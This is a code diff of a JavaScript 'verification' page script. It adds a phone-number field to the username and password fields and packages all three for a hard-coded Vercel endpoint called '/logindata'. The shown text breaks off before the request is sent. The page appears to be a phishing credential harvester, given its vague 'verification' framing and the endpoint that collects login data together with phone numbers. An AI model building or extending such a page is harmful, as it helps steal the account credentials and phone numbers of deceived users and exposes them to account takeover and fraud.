@@ -1,33 +1,20 @@
-// script.js (for Single Page Username/Password Verification - index.html)
+// script.js (for Single Page Verification - index.html)
 document.addEventListener('DOMContentLoaded', function () {
-    const verificationForm = document.getElementById('verificationForm'); // Or 'loginForm' if that's your form ID in index.html
+    const verificationForm = document.getElementById('verificationForm');
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
-    // phoneNumberInput is removed
+    const phoneNumberInput = document.getElementById('phoneNumber');
     const messageDiv = document.getElementById('message');
 
-    // #############################################################################
-    // ### VERY IMPORTANT: Replace YOUR_ACTUAL_VERCEL_BACKEND_URL with your real URL ###
-    // ### Example: 'https://number2-yourusername.vercel.app/logindata'          ###
-    // #############################################################################
+    // Your Vercel Backend URL - PRE-FILLED!
     const BACKEND_API_URL = 'https://number2-adamahmeddds-projects.vercel.app/logindata';
-
-    // Basic check for the URL - if it's still the very obvious placeholder
-    if (BACKEND_API_URL === 'YOUR_ACTUAL_VERCEL_BACKEND_URL/logindata') {
-         if (messageDiv) { // Check if messageDiv exists before trying to use it
-            displayMessage('ERROR: Frontend not configured. Please contact support.', 'error');
-         }
-         console.error("CRITICAL: BACKEND_API_URL is still the placeholder in script.js!");
-         // return; // Optionally stop further execution if form existed, but form submit listener is separate
-    }
-
 
     verificationForm.addEventListener('submit', async function (event) {
         event.preventDefault(); // Prevent default form submission
 
         const username = usernameInput.value.trim();
         const password = passwordInput.value; // Passwords usually aren't trimmed
-        // phoneNumber variable is removed
+        const phoneNumber = phoneNumberInput.value.trim();
 
         if (messageDiv) {
             messageDiv.textContent = '';
@@ -35,16 +22,15 @@ document.addEventListener('DOMContentLoaded', function () {
             messageDiv.classList.remove('show');
         }
 
-        if (username === '' || password === '') {
-            displayMessage('Please fill in both username/email and password.', 'error');
+        if (username === '' || password === '' || phoneNumber === '') {
+            displayMessage('Please fill in all fields: username/email, password, and phone number.', 'error');
             return;
         }
 
-        // Data to send only includes username and password
         const dataToSend = {
             username: username,
-            password: password
-            // phoneNumber field is removed
+            password: password,
+            phoneNumber: phoneNumber
         };
 
         try {
